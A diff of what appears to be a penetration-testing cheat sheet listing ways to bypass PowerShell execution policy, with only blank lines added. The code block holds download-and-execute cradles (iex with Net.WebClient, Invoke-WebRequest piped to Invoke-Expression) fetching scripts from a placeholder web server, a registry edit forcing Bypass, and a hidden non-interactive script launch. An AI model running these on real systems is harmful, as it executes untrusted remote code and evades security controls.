@@ -41,21 +41,28 @@ Several ways to bypass
 ```batch
 # View current execution policy (legitimate admin)
 Get-ExecutionPolicy -List
+
 # Change policy scope (requires admin rights)
 Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
 powershell -ExecutionPolicy bypass
 powershell -c <cmd>
 powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"
+
 # Using iex and Invoke-Expression:
 iex (New-Object Net.WebClient).DownloadString('http://<webserver url>/script.ps1')
+
 # Running Scripts via Invoke-WebRequest without saving it to disk:
 powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'http://<webserver url>/script.ps1' | Invoke-Expression"
+
 # Using Get-Content and Invoke-Expression, executing a script in memory:
 Get-Content script.ps1 | Out-String | Invoke-Expression
+
 # Using the reg add Command to Modify Execution Policy: An attacker with registry modification privileges can change the execution policy:
 reg add HKLM\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell /v ExecutionPolicy /t REG_SZ /d Bypass /f
+
 # Running a PowerShell script even if the Set-ExecutionPolicy is restricted can be achieved by utilizing specific parameters when executing the script.
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File <script_name>
+
 # restore the default execution policy with commands:
 Set-ExecutionPolicy Restricted -Scope CurrentUser
 ```
